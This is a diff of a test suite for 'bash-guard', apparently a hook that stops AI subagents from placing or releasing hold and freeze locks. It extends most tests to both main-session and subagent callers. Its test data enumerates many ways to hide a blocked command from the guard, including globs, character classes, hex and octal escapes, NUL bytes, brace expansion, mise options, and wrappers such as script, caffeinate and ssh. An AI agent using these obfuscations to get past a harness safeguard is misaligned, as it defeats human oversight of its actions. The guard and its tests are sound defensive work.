-    'bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason "deploy freeze"',
-    'bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason "release the freeze.ts later"',
-    "bun run - < /tmp/input.ts",
-    "cat /tmp/input.ts | bun run -",
-    "cat < /tmp/input.ts | bun run -",
-    "cat <<'EOF' | bun run -\nconsole.log(1)\nEOF",
-    "cat package.json | bun run - list",
-    "echo 'console.log(1)' | bun run -",
-    "echo \"import './scripts/freeze.ts'\" | bun run - list",
-    "bun test",
-    "bunx biome check scripts/fre?ze.ts",
-    "bun -e \"import './scripts/freeze.ts'\"",
-    "bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason r",
-    "bun test tests/scripts/freeze.test.ts tests/lib/freezes.test.ts",
-    "bun test tests/scripts/freeze_wiring.test.ts",
-    "bunx biome check scripts/freeze.ts",
-    "bunx tsc --noEmit scripts/freeze.ts",
-    "git add scripts/freeze.ts f/factory/lib/freezes.ts",
-    "git diff -- scripts/freeze.ts",
-    "cat scripts/freeze.ts",
-    "grep -n release scripts/freeze.ts",
-    "echo 'freeze.ts release is for the main session'",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+    test.skipIf(!subagent)(
+      "the reason is the hold reason for releasing a freeze",
+      async () => {
+        expect(
+          await denyReason("mise run freeze:release -- 1", { subagent }),
+        ).toContain("main session");
+      },
+    );
+  },
+);
 
-describe("bash-guard leaves the main session free to place a deploy freeze and release a freeze", () => {
-  test.each([
-    "mise run freeze:place -- --scope deploy --minutes 60 --reason x",
-    "mise run freeze:release -- d0a1b2c3",
-    "bun scripts/freeze.ts place --scope deploy --minutes 60 --reason x",
-    "bun scripts/freeze.ts release d0a1b2c3",
-    "mise exec -- bun scripts/freeze.ts release 1",
-  ])("%s", async (command) => {
-    expect(await decide(command)).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard allows a caller to place a schedule freeze and to list freezes",
+  (subagent) => {
+    test.each([
+      "mise run freeze:list",
+      "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason verify",
+      "mise run freeze:place -- --scope schedule --target f/factory/collect_github --minutes 30 --reason verify",
+      "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason 'check the deploy'",
+      "mise run freeze:place -- --target f/factory/collect_github --minutes 30 --reason deploy",
+      "mise run push:dry",
+      "mise run check",
+      "bun scripts/freeze.ts list",
+      "bun scripts/freeze.ts check",
+      "bun scripts/freeze.ts -- list",
+      'bun test tests/scripts/freeze.test.ts -t "deploy freeze"',
+      "bun test --test-name-pattern 'deploy freeze'",
+      'bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason "deploy freeze"',
+      'bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason "release the freeze.ts later"',
+      "bun run - < /tmp/input.ts",
+      "cat /tmp/input.ts | bun run -",
+      "cat < /tmp/input.ts | bun run -",
+      "cat <<'EOF' | bun run -\nconsole.log(1)\nEOF",
+      "cat package.json | bun run - list",
+      "echo 'console.log(1)' | bun run -",
+      "echo \"import './scripts/freeze.ts'\" | bun run - list",
+      "bun test",
+      "bunx biome check scripts/fre?ze.ts",
+      "bun -e \"import './scripts/freeze.ts'\"",
+      "bun scripts/freeze.ts place --target f/factory/collect_github --minutes 5 --reason r",
+      "bun test tests/scripts/freeze.test.ts tests/lib/freezes.test.ts",
+      "bun test tests/scripts/freeze_wiring.test.ts",
+      "bunx biome check scripts/freeze.ts",
+      "bunx tsc --noEmit scripts/freeze.ts",
+      "git add scripts/freeze.ts f/factory/lib/freezes.ts",
+      "git diff -- scripts/freeze.ts",
+      "cat scripts/freeze.ts",
+      "grep -n release scripts/freeze.ts",
+      "echo 'freeze.ts release is for the main session'",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // `mise generate`のうち、フックやワークフローのファイルへ書く形は拒否する。
 describe("bash-guard denies mise generate that writes hook or workflow files", () => {
@@ -1685,66 +1866,72 @@ describe("bash-guard allows mise generate that only prints", () => {
 });
 
 // 値を取るオプションを読み飛ばさずに、保留の操作を拒否する。
-describe("bash-guard denies a subagent that hides a hold operation behind options", () => {
-  test.each([
-    "mise run --timeout 5m hold:release -- 3",
-    "mise run -o prefix hold:place",
-    "mise run --unknown-option hold:place",
-    "mise run -j 2 hold:release 4",
-    "mise tasks run -j 2 hold:place",
-    "mise t run hold:place",
-    "mise watch hold:place",
-    "mise w hold:place",
-    'mise watch "$TASK"',
-    'mise t run "$TASK"',
-    "mise run lint hold:place",
-    "mise run test -- hold:place",
-    "mise x -- mise run -o keep hold:release 1",
-    "bun --preload ./x.ts scripts/hold.ts place --scope merge",
-    "bun --preload test scripts/hold.ts place",
-    "bun --bun scripts/hold.ts place",
-    "bun --silent run scripts/hold.ts release 1",
-    "tsx --tsconfig tsconfig.json scripts/hold.ts release 1",
-    "deno run --import-map map.json scripts/hold.ts place",
-    "node --import tsx scripts/hold.ts place",
-    "bunx --bun tsx scripts/hold.ts place",
-    "bun exec 'bun scripts/hold.ts place --scope merge'",
-    'bun exec "mise run hold:place"',
-    "bun run scripts/hold place --scope merge --target a/b --minutes 5 --reason x",
-    "bun scripts/hold place",
-    "bun ./scripts/hold release 1",
-    "bun run scripts/hold_psql",
-    "bun scripts/hold_psql.ts",
-    "bun run f/factory/lib/holds",
-    "bun scripts/hold.ts --verbose list",
-    "./scripts/hold.ts place",
-    "scripts/hold.ts release 1",
-    "bun -e \"import './scripts/hold'\"",
-    "bun -e \"await import('../f/factory/lib/holds')\"",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that hides a hold operation behind options",
+  (subagent) => {
+    test.each([
+      "mise run --timeout 5m hold:release -- 3",
+      "mise run -o prefix hold:place",
+      "mise run --unknown-option hold:place",
+      "mise run -j 2 hold:release 4",
+      "mise tasks run -j 2 hold:place",
+      "mise t run hold:place",
+      "mise watch hold:place",
+      "mise w hold:place",
+      'mise watch "$TASK"',
+      'mise t run "$TASK"',
+      "mise run lint hold:place",
+      "mise run test -- hold:place",
+      "mise x -- mise run -o keep hold:release 1",
+      "bun --preload ./x.ts scripts/hold.ts place --scope merge",
+      "bun --preload test scripts/hold.ts place",
+      "bun --bun scripts/hold.ts place",
+      "bun --silent run scripts/hold.ts release 1",
+      "tsx --tsconfig tsconfig.json scripts/hold.ts release 1",
+      "deno run --import-map map.json scripts/hold.ts place",
+      "node --import tsx scripts/hold.ts place",
+      "bunx --bun tsx scripts/hold.ts place",
+      "bun exec 'bun scripts/hold.ts place --scope merge'",
+      'bun exec "mise run hold:place"',
+      "bun run scripts/hold place --scope merge --target a/b --minutes 5 --reason x",
+      "bun scripts/hold place",
+      "bun ./scripts/hold release 1",
+      "bun run scripts/hold_psql",
+      "bun scripts/hold_psql.ts",
+      "bun run f/factory/lib/holds",
+      "bun scripts/hold.ts --verbose list",
+      "./scripts/hold.ts place",
+      "scripts/hold.ts release 1",
+      "bun -e \"import './scripts/hold'\"",
+      "bun -e \"await import('../f/factory/lib/holds')\"",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard keeps allowing inspection of the hold code", () => {
-  test.each([
-    "bun scripts/hold list",
-    "bun run scripts/hold list",
-    "bun test tests/scripts/hold.test.ts",
-    "bun test tests/lib/holds.test.ts tests/lib/holds_db.test.ts",
-    "bunx biome check scripts/hold.ts",
-    "bunx --bun biome check scripts/hold.ts scripts/hold_psql.ts",
-    "bunx tsc --noEmit scripts/hold.ts",
-    "bun run scripts/lint-no-type-assertions.ts scripts/hold.ts",
-    "bun run scripts/lint-docs.ts docs/internals/holds.md",
-    "mise -C /repo run check",
-    "mise run lint ::: typecheck",
-    "mise run hold:list",
-    "mise watch check",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard keeps allowing inspection of the hold code",
+  (subagent) => {
+    test.each([
+      "bun scripts/hold list",
+      "bun run scripts/hold list",
+      "bun test tests/scripts/hold.test.ts",
+      "bun test tests/lib/holds.test.ts tests/lib/holds_db.test.ts",
+      "bunx biome check scripts/hold.ts",
+      "bunx --bun biome check scripts/hold.ts scripts/hold_psql.ts",
+      "bunx tsc --noEmit scripts/hold.ts",
+      "bun run scripts/lint-no-type-assertions.ts scripts/hold.ts",
+      "bun run scripts/lint-docs.ts docs/internals/holds.md",
+      "mise -C /repo run check",
+      "mise run lint ::: typecheck",
+      "mise run hold:list",
+      "mise watch check",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 describe("bash-guard reads the script of bun exec as shell input", () => {
   test.each([
@@ -1764,65 +1951,71 @@ describe("bash-guard reads the script of bun exec as shell input", () => {
 });
 
 // glob、引用符の中の文字コード、miseの全体オプションで、保留の操作を隠す形を拒否する。
-describe("bash-guard denies a subagent that hides a hold operation behind a pattern", () => {
-  test.each([
-    "mise run h[o]ld:place",
-    "mise run 'hold:[pr]*'",
-    "mise run hold:[pr]*",
-    "mise run hold:rel[a-z]ase 1",
-    "mise run hold:[!l]*",
-    "mise run hold:pla?e",
-    "mise run hold:*",
-    "mise hold:place",
-    "mise hold:release 3",
-    "mise hold*",
-    "mise -q hold:place",
-    "bun scripts/hol?.ts place",
-    "bun scripts/hol[d].ts place",
-    "bun scripts/ho*.ts place",
-    "bun run scripts/*.ts",
-    "bun run f/factory/lib/hold?.ts",
-    "bun scripts/hol[!x].ts place",
-    "bun run ./scripts/hol?",
-    "bun $'scripts/hol\\x64.ts' place",
-    "bun $'scripts/hol\\144.ts' place",
-    "bun $'scripts/hol\\u0064.ts' place",
-    "bun $'scripts/hol\\U00000064.ts' place",
-    "mise run $'\\x68old:place'",
-    "mise run $'hold\\x3aplace'",
-    "mise run $'hold\\072release' 1",
-    "npm exec tsx scripts/hold.ts place",
-    "pnpm exec tsx scripts/hold.ts place",
-    "pnpx tsx scripts/hold.ts place",
-    "yarn tsx scripts/hold.ts place",
-    "yarn dlx tsx scripts/hold.ts release 1",
-    "npm run hold -- place",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that hides a hold operation behind a pattern",
+  (subagent) => {
+    test.each([
+      "mise run h[o]ld:place",
+      "mise run 'hold:[pr]*'",
+      "mise run hold:[pr]*",
+      "mise run hold:rel[a-z]ase 1",
+      "mise run hold:[!l]*",
+      "mise run hold:pla?e",
+      "mise run hold:*",
+      "mise hold:place",
+      "mise hold:release 3",
+      "mise hold*",
+      "mise -q hold:place",
+      "bun scripts/hol?.ts place",
+      "bun scripts/hol[d].ts place",
+      "bun scripts/ho*.ts place",
+      "bun run scripts/*.ts",
+      "bun run f/factory/lib/hold?.ts",
+      "bun scripts/hol[!x].ts place",
+      "bun run ./scripts/hol?",
+      "bun $'scripts/hol\\x64.ts' place",
+      "bun $'scripts/hol\\144.ts' place",
+      "bun $'scripts/hol\\u0064.ts' place",
+      "bun $'scripts/hol\\U00000064.ts' place",
+      "mise run $'\\x68old:place'",
+      "mise run $'hold\\x3aplace'",
+      "mise run $'hold\\072release' 1",
+      "npm exec tsx scripts/hold.ts place",
+      "pnpm exec tsx scripts/hold.ts place",
+      "pnpx tsx scripts/hold.ts place",
+      "yarn tsx scripts/hold.ts place",
+      "yarn dlx tsx scripts/hold.ts release 1",
+      "npm run hold -- place",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard denies a subagent that puts mise options before exec", () => {
-  test.each([
-    "mise -q exec -- bun scripts/hold.ts place",
-    "mise -q x -- bun scripts/hold.ts place",
-    "mise -v x -- bun scripts/hold.ts place",
-    "mise -vv x -- bun scripts/hold.ts place",
-    "mise -y exec -- bun scripts/hold.ts place",
-    "mise -C /repo x -- bun scripts/hold.ts release 1",
-    "mise --cd /repo exec -- bun scripts/hold.ts place",
-    "mise --cd=/repo exec -- bun scripts/hold.ts place",
-    "mise -E ci x -- bun scripts/hold.ts place",
-    "mise -P dev exec -- bun scripts/hold.ts place",
-    "mise -qy -C /repo x -- bun scripts/hold.ts place",
-    "mise --no-config x -- bun scripts/hold.ts place",
-    "mise -q -C /repo -E ci exec node@22 -- bun scripts/hold.ts place",
-    "mise -q run hold:place",
-    "mise -C /repo run hold:release 1",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that puts mise options before exec",
+  (subagent) => {
+    test.each([
+      "mise -q exec -- bun scripts/hold.ts place",
+      "mise -q x -- bun scripts/hold.ts place",
+      "mise -v x -- bun scripts/hold.ts place",
+      "mise -vv x -- bun scripts/hold.ts place",
+      "mise -y exec -- bun scripts/hold.ts place",
+      "mise -C /repo x -- bun scripts/hold.ts release 1",
+      "mise --cd /repo exec -- bun scripts/hold.ts place",
+      "mise --cd=/repo exec -- bun scripts/hold.ts place",
+      "mise -E ci x -- bun scripts/hold.ts place",
+      "mise -P dev exec -- bun scripts/hold.ts place",
+      "mise -qy -C /repo x -- bun scripts/hold.ts place",
+      "mise --no-config x -- bun scripts/hold.ts place",
+      "mise -q -C /repo -E ci exec node@22 -- bun scripts/hold.ts place",
+      "mise -q run hold:place",
+      "mise -C /repo run hold:release 1",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 describe("bash-guard keeps mise global options from hiding secrets", () => {
   test.each([
@@ -1856,46 +2049,54 @@ describe("bash-guard reads the character codes of a quoted word", () => {
   });
 });
 
-describe("bash-guard allows work that only looks like a hold operation", () => {
-  test.each([
-    "mise run test:*",
-    "mise run test:unit",
-    "bun test tests/scripts/hold.test.ts",
-    "bun test tests/scripts/ho*.test.ts",
-    "mise -C /repo run check",
-    "mise -q run check",
-    "mise --cd /repo run lint",
-    "mise tasks info hold:place",
-    "mise tasks ls",
-    "mise t ls",
-    "bunx @biomejs/biome check scripts/hold.ts",
-    "npm test tests/scripts/hold.test.ts",
-    "pnpm exec biome check scripts/hold.ts",
-    "npx biome check scripts/hold.ts",
-    "bun run scripts/lint-docs.ts docs/*.md",
-    "mise -q x -- echo hi",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard allows work that only looks like a hold operation",
+  (subagent) => {
+    test.each([
+      "mise run test:*",
+      "mise run test:unit",
+      "bun test tests/scripts/hold.test.ts",
+      "bun test tests/scripts/ho*.test.ts",
+      "mise -C /repo run check",
+      "mise -q run check",
+      "mise --cd /repo run lint",
+      "mise tasks info hold:place",
+      "mise tasks ls",
+      "mise t ls",
+      "bunx @biomejs/biome check scripts/hold.ts",
+      "npm test tests/scripts/hold.test.ts",
+      "pnpm exec biome check scripts/hold.ts",
+      "npx biome check scripts/hold.ts",
+      "bun run scripts/lint-docs.ts docs/*.md",
+      "mise -q x -- echo hi",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
-describe("bash-guard says why a dynamic mise word is denied", () => {
-  test("the reason for a dynamic option value names the variable", async () => {
-    expect(await denyReason('mise -C "$DIR" run check')).toContain("variable");
-  });
+describeForCallers(
+  "bash-guard says why a dynamic mise word is denied",
+  (subagent) => {
+    test("the reason for a dynamic option value names the variable", async () => {
+      expect(await denyReason('mise -C "$DIR" run check')).toContain(
+        "variable",
+      );
+    });
 
-  test("the reason names the dynamic word", async () => {
-    expect(await denyReason('mise run "$TASK"', { subagent: true })).toContain(
-      "variable",
-    );
-  });
+    test("the reason names the dynamic word", async () => {
+      expect(await denyReason('mise run "$TASK"', { subagent })).toContain(
+        "variable",
+      );
+    });
 
-  test("the reason for a held task names the hold tasks", async () => {
-    expect(
-      await denyReason("mise run hold:place", { subagent: true }),
-    ).toContain("hold:place");
-  });
-});
+    test("the reason for a held task names the hold tasks", async () => {
+      expect(await denyReason("mise run hold:place", { subagent })).toContain(
+        "hold:place",
+      );
+    });
+  },
+);
 
 describe("bash-guard denies mise generate that writes anywhere in the hook or workflow paths", () => {
   test.each([
@@ -1923,66 +2124,72 @@ describe("bash-guard denies mise generate that writes anywhere in the hook or wo
 });
 
 // シェルが語を組み立てる形(文字クラス、ディレクトリの揺れ、NUL、$"、ブレース、=コマンド)で、保留の操作を隠す。
-describe("bash-guard denies a subagent that builds the hold code with a pattern", () => {
-  test.each([
-    "mise run hold:[[:lower:]]*",
-    "mise run hold:[[=p=]]lace",
-    "mise run 'hold:[[.p.]]lace'",
-    "bun scripts/hol[[:lower:]].ts place",
-    "bun scripts/[[.h.]]old.ts place",
-    "bun scripts//hol?.ts place",
-    "bun scripts/./hol?.ts place",
-    "bun scripts/x/../hol?.ts place",
-    "bun /abs/dir/hol?.ts place",
-    "bun ../hol?.ts place",
-    "bun run ./hol[d].ts",
-    "bun $'scripts/hold.ts\\0junk' place",
-    "bun $'scripts/hol\\x00d.ts' place",
-    "bun $'scripts/hol\\000d.ts' place",
-    "mise run $'hold:pla\\u0000ce'",
-    "mise run $'hold:place\\x00x'",
-    'mise run $"hold:place"',
-    'bun scripts/$"hold".ts place',
-    "bun --cwd scripts {hold.ts,place}",
-    "bun scripts/{hold,x}.ts place",
-    "bun run {scripts/hold.ts,x}",
-    "bun {a,scripts/hold}.ts place",
-    "bun h{old,x}.ts place",
-    "bun scripts/ho{ld,x}.ts place",
-    "=bun scripts/hold.ts place",
-    "=mise run hold:place",
-    "=env bun scripts/hold.ts place",
-    "=node scripts/hold.ts release 1",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that builds the hold code with a pattern",
+  (subagent) => {
+    test.each([
+      "mise run hold:[[:lower:]]*",
+      "mise run hold:[[=p=]]lace",
+      "mise run 'hold:[[.p.]]lace'",
+      "bun scripts/hol[[:lower:]].ts place",
+      "bun scripts/[[.h.]]old.ts place",
+      "bun scripts//hol?.ts place",
+      "bun scripts/./hol?.ts place",
+      "bun scripts/x/../hol?.ts place",
+      "bun /abs/dir/hol?.ts place",
+      "bun ../hol?.ts place",
+      "bun run ./hol[d].ts",
+      "bun $'scripts/hold.ts\\0junk' place",
+      "bun $'scripts/hol\\x00d.ts' place",
+      "bun $'scripts/hol\\000d.ts' place",
+      "mise run $'hold:pla\\u0000ce'",
+      "mise run $'hold:place\\x00x'",
+      'mise run $"hold:place"',
+      'bun scripts/$"hold".ts place',
+      "bun --cwd scripts {hold.ts,place}",
+      "bun scripts/{hold,x}.ts place",
+      "bun run {scripts/hold.ts,x}",
+      "bun {a,scripts/hold}.ts place",
+      "bun h{old,x}.ts place",
+      "bun scripts/ho{ld,x}.ts place",
+      "=bun scripts/hold.ts place",
+      "=mise run hold:place",
+      "=env bun scripts/hold.ts place",
+      "=node scripts/hold.ts release 1",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard denies a subagent that puts the options of mise in new places", () => {
-  test.each([
-    "mise --log-level debug exec -- bun scripts/hold.ts place",
-    "mise --output quiet x -- bun scripts/hold.ts place",
-    "mise -s bash x -- bun scripts/hold.ts place",
-    "mise --shell zsh exec -- bun scripts/hold.ts place",
-    "mise -t node x -- bun scripts/hold.ts place",
-    "mise --tool node@22 exec -- bun scripts/hold.ts place",
-    "mise -EC x -- bun scripts/hold.ts place",
-    "mise -qEC x -- bun scripts/hold.ts place",
-    "mise --future-flag value x -- bun scripts/hold.ts place",
-    "mise --future-flag run check",
-    "mise --future-flag value run hold:place",
-    "mise run x -- bun scripts/hold.ts place",
-    "mise run x bun scripts/hold.ts place",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard denies a caller that puts the options of mise in new places",
+  (subagent) => {
+    test.each([
+      "mise --log-level debug exec -- bun scripts/hold.ts place",
+      "mise --output quiet x -- bun scripts/hold.ts place",
+      "mise -s bash x -- bun scripts/hold.ts place",
+      "mise --shell zsh exec -- bun scripts/hold.ts place",
+      "mise -t node x -- bun scripts/hold.ts place",
+      "mise --tool node@22 exec -- bun scripts/hold.ts place",
+      "mise -EC x -- bun scripts/hold.ts place",
+      "mise -qEC x -- bun scripts/hold.ts place",
+      "mise --future-flag value x -- bun scripts/hold.ts place",
+      "mise --future-flag run check",
+      "mise --future-flag value run hold:place",
+      "mise run x -- bun scripts/hold.ts place",
+      "mise run x bun scripts/hold.ts place",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("the reason for an unknown option says to write a known one", async () => {
-    expect(
-      await denyReason("mise --future-flag run check", { subagent: true }),
-    ).toContain("option");
-  });
-});
+    test("the reason for an unknown option says to write a known one", async () => {
+      expect(
+        await denyReason("mise --future-flag run check", { subagent }),
+      ).toContain("option");
+    });
+  },
+);
 
 describe("bash-guard keeps the secret check working behind unknown mise options", () => {
   test.each([
@@ -2016,38 +2223,41 @@ describe("bash-guard reads =command of zsh as the command", () => {
   });
 });
 
-describe("bash-guard allows work that only looks like a pattern", () => {
-  test.each([
-    "mise run check",
-    "mise run test -- -t '*'",
-    "mise run test -- -t 'ho*'",
-    'mise run test -- "$ARG"',
-    "mise -C /repo run check",
-    "mise -q x -- echo hi",
-    "mise --log-level debug run check",
-    "mise --future-flag=1 run check",
-    "bun test tests/scripts/hold.test.ts",
-    "bun test tests/scripts/{a,b}.test.ts",
-    "bun test tests/scripts/ho[[:lower:]]d.test.ts",
-    "bunx --bun biome check scripts/hold.ts",
-    "bunx @biomejs/biome@1.9.4 check scripts/hold.ts",
-    "npx --yes @biomejs/biome check scripts/hold.ts",
-    "npx -y biome check scripts/hold.ts",
-    "bun -e 'console.log({a:1})'",
-    'echo $"hi"',
-    "=bun test tests/scripts/hold.test.ts",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
+describeForCallers(
+  "bash-guard allows work that only looks like a pattern",
+  (subagent) => {
+    test.each([
+      "mise run check",
+      "mise run test -- -t '*'",
+      "mise run test -- -t 'ho*'",
+      'mise run test -- "$ARG"',
+      "mise -C /repo run check",
+      "mise -q x -- echo hi",
+      "mise --log-level debug run check",
+      "mise --future-flag=1 run check",
+      "bun test tests/scripts/hold.test.ts",
+      "bun test tests/scripts/{a,b}.test.ts",
+      "bun test tests/scripts/ho[[:lower:]]d.test.ts",
+      "bunx --bun biome check scripts/hold.ts",
+      "bunx @biomejs/biome@1.9.4 check scripts/hold.ts",
+      "npx --yes @biomejs/biome check scripts/hold.ts",
+      "npx -y biome check scripts/hold.ts",
+      "bun -e 'console.log({a:1})'",
+      'echo $"hi"',
+      "=bun test tests/scripts/hold.test.ts",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
 
-  test.each([
-    "mise run lint -- hold:place",
-    "mise run test -- hold:*",
-    "mise run test -- hold:release 3",
-  ])("%s stays denied after --", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+    test.each([
+      "mise run lint -- hold:place",
+      "mise run test -- hold:*",
+      "mise run test -- hold:release 3",
+    ])("%s stays denied after --", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 describe("bash-guard compares the write path of mise generate loosely", () => {
   test.each([
@@ -2072,37 +2282,43 @@ describe("bash-guard compares the write path of mise generate loosely", () => {
 });
 
 // 括弧の中のPOSIX文字クラスと、zshのglobのまとまりと、生成先のglobで、拒否を逃れない。
-describe("bash-guard denies a subagent that hides the hold code in a class or a group", () => {
-  test.each([
-    "bun scripts/hol[![:upper:]].ts place",
-    "bun scripts/hol[^[:upper:]].ts place",
-    "bun scripts/[![=x=]]old.ts place",
-    "bun scripts/hol[a[.d.]].ts place",
-    "mise run hold:[!a[:upper:]]*",
-    "bun scripts/(ho)ld.ts place",
-    "bun scripts/hol(d).ts place",
-    "bun (ho)ld.ts place",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that hides the hold code in a class or a group",
+  (subagent) => {
+    test.each([
+      "bun scripts/hol[![:upper:]].ts place",
+      "bun scripts/hol[^[:upper:]].ts place",
+      "bun scripts/[![=x=]]old.ts place",
+      "bun scripts/hol[a[.d.]].ts place",
+      "mise run hold:[!a[:upper:]]*",
+      "bun scripts/(ho)ld.ts place",
+      "bun scripts/hol(d).ts place",
+      "bun (ho)ld.ts place",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard keeps allowing parentheses that are not a glob group", () => {
-  test.each([
-    "arr=(a b)",
-    "f() { :; }",
-    "f () { :; }",
-    "(echo hi && ls)",
-    "if (true); then echo hi; fi",
-    "! (false)",
-    "for ((i=0;i<3;i++)); do :; done",
-    "echo $(date)",
-    "diff <(echo a) <(echo b)",
-    "echo a | (cat)",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard keeps allowing parentheses that are not a glob group",
+  (subagent) => {
+    test.each([
+      "arr=(a b)",
+      "f() { :; }",
+      "f () { :; }",
+      "(echo hi && ls)",
+      "if (true); then echo hi; fi",
+      "! (false)",
+      "for ((i=0;i<3;i++)); do :; done",
+      "echo $(date)",
+      "diff <(echo a) <(echo b)",
+      "echo a | (cat)",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 describe("bash-guard denies mise generate whose write path is a pattern", () => {
   test.each([
@@ -2576,630 +2792,701 @@ describe("bash-guard keeps reading prefixes and nested strings for the stop-all"
 });
 
 // `script`、`unbuffer`、`caffeinate`、`/usr/bin/time`のような前置きの後ろでも、保留と凍結の書き込みはsubagentに許さない。
-describe("bash-guard denies a subagent that writes holds or freezes behind a prefix", () => {
-  test.each([
-    "script -q /dev/null mise run hold:release 1",
-    "script -q /dev/null mise run hold:place -- --scope merge --target a/b --minutes 5 --reason x",
-    "unbuffer mise run freeze:release 1",
-    "unbuffer mise run freeze:place -- --scope deploy --minutes 5 --reason x",
-    "caffeinate bun scripts/hold.ts release 1",
-    "caffeinate -t 60 mise run hold:place",
-    "/usr/bin/time bun scripts/freeze.ts release 1",
-    "ssh host mise run hold:release 1",
-    "caffeinate bunx tsx scripts/hold.ts place",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard denies a caller that writes holds or freezes behind a prefix",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null mise run hold:release 1",
+      "script -q /dev/null mise run hold:place -- --scope merge --target a/b --minutes 5 --reason x",
+      "unbuffer mise run freeze:release 1",
+      "unbuffer mise run freeze:place -- --scope deploy --minutes 5 --reason x",
+      "caffeinate bun scripts/hold.ts release 1",
+      "caffeinate -t 60 mise run hold:place",
+      "/usr/bin/time bun scripts/freeze.ts release 1",
+      "ssh host mise run hold:release 1",
+      "caffeinate bunx tsx scripts/hold.ts place",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("the reason is the hold reason", async () => {
-    expect(
-      await denyReason("script -q /dev/null mise run hold:release 1", {
-        subagent: true,
-      }),
-    ).toContain("main session");
-  });
-});
+    test.skipIf(!subagent)("the reason is the hold reason", async () => {
+      expect(
+        await denyReason("script -q /dev/null mise run hold:release 1", {
+          subagent,
+        }),
+      ).toContain("main session");
+    });
+  },
+);
 
 // 起動語(`mise`、実行系、シェル)が前置きの後ろに無くても、保留や凍結のCLIを指す語の直後が書き込みなら拒否する。
-describe("bash-guard denies a subagent that runs the hold or freeze CLI directly behind a prefix", () => {
-  test.each([
-    "script -q /dev/null ./scripts/hold.ts release 1",
-    "script -q ./scripts/hold.ts release 1",
-    "script -q mise ./scripts/hold.ts release 1",
-    "script -q sh ./scripts/hold.ts release 1",
-    "script -q /dev/null ./scripts/hold.ts -- release 1",
-    "caffeinate ./scripts/freeze.ts release 1",
-    "caffeinate ./scripts/hold.ts place --scope merge --target a/b --minutes 5 --reason x",
-    "script -q /dev/null python3 scripts/hold.ts release 1",
-    "caffeinate find . -maxdepth 0 -exec ./scripts/hold.ts release 1 \\; -exec bun --version \\;",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that runs the hold or freeze CLI directly behind a prefix",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null ./scripts/hold.ts release 1",
+      "script -q ./scripts/hold.ts release 1",
+      "script -q mise ./scripts/hold.ts release 1",
+      "script -q sh ./scripts/hold.ts release 1",
+      "script -q /dev/null ./scripts/hold.ts -- release 1",
+      "caffeinate ./scripts/freeze.ts release 1",
+      "caffeinate ./scripts/hold.ts place --scope merge --target a/b --minutes 5 --reason x",
+      "script -q /dev/null python3 scripts/hold.ts release 1",
+      "caffeinate find . -maxdepth 0 -exec ./scripts/hold.ts release 1 \\; -exec bun --version \\;",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 前置きの後ろでも、サブコマンドが読めない形(実行時に決まる語、glob、ブレース、語を足す前置き)は拒否する。
-describe("bash-guard denies a subagent whose subcommand behind a prefix cannot be read", () => {
-  test.each([
-    "script -q /dev/null ./scripts/hold.ts $ACTION 1",
